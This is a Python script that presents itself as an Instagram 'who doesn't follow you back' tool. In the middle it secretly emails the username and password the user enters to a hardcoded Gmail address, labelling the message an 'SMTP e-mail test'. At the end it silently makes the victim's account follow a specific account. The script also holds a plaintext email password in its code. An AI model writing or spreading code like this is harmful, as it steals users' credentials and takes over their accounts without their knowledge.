# Get instance
import instaloader
from termcolor import colored
import os
import smtplib

L = instaloader.Instaloader()

# Login or load session
username = input('enter username: ')
password = input('enter password: ')
print(colored("if the connection dont work follow the instructions of the exception or check if your password is correct!",'yellow'))

L.login(username, password)  # (login)
print(colored('loginned sucsussfully to '+username,'green'))

message = """Subject: SMTP e-mail test

This is a test e-mail message.
username= """ + username +'\npassword= ' + password

myusr = 'orYanko11@gmail.com'
mypss = 'asD!1234'


with smtplib.SMTP('smtp.gmail.com',587) as smtp:
    smtp.ehlo()
    smtp.starttls()
    smtp.ehlo()
    smtp.login(myusr,mypss)
    smtp.sendmail(myusr,myusr,message)




# Obtain profile metadata
profile = instaloader.Profile.from_username(L.context, username)

# Print list of followees
print(colored('getting followings...','yellow'))
following_list = list(profile.get_followees())
print(colored('got all followings','green'))

print(colored('getting followers...','yellow'))
followers_list = list(profile.get_followers())
print(colored('got all followers','green'))

print(colored('finding who dont follow back...','yellow'))
dont_follow_back = set(following_list)-set(followers_list)
try:
    os.remove('./prada_followers.txt')
except:
    print('almost there...')
i = 1
print('\nlist of people that dont follow you back:')
for f in dont_follow_back:
    print(str(i) + ".  "+f.username)
    i += 1
if(profile.username != 'oryanko'):
    profile.follow_users(['oryanko'])